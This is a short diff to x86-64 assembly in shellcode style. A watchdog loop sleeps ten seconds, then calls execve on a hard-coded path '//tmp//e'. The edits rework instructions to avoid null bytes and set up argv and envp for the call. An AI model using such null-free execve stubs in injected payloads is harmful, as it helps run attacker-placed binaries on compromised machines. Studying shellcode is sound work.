@@ -25,8 +25,10 @@ watchdog:
 	;;   sleep
 	mov  rax, 0
 	mov  al, 0x23; syscall nanosleep
-	push 10; sleep sec
-	push 10
+	xor  rbx, rbx
+	mov  bl, 10
+	push rbx; sleep sec
+	push rbx
 	mov  rdi, rsp
 	xor  rsi, rsi; no more args
 	xor  rdx, rdx
@@ -34,15 +36,26 @@ watchdog:
 	loop watchdog
 
 exec:
-	xor  rsi, rsi
-	push rsi; '\0' string terminator
-	mov  rdi, 0x652f2f706d742f2f
-	push rdi
+	;;   char **envp
+	xor  rdx, rdx
+	push rdx
+
+	;;   char *filename
+	xor  rax, rax
+	push rax; '\0' string terminator
+	mov  rdi, 0x652f2f706d742f2f; path to the executable
+	push rdi; save to stack
 	push rsp
 	pop  rdi
-	mov  rdi, rsp; pointer to "\/\/tmp\/\/e"
-	push 0x3b
-	pop  rax
+	mov  rdi, rsp
+
+	;;   char **argv
+	push rdx; '\0'
+	push rdi
+	mov  rsi, rsp; argv[0]
+
+	push 0x3b; syscall execve
+	pop  rax; ready to call
 	cdq
 	syscall
 
@@ -58,3 +71,5 @@ pause:
 	; mov al, 0x3c; syscall exit
 	; mov di, 0x0; exit code
 	; syscall
+
+	section .data
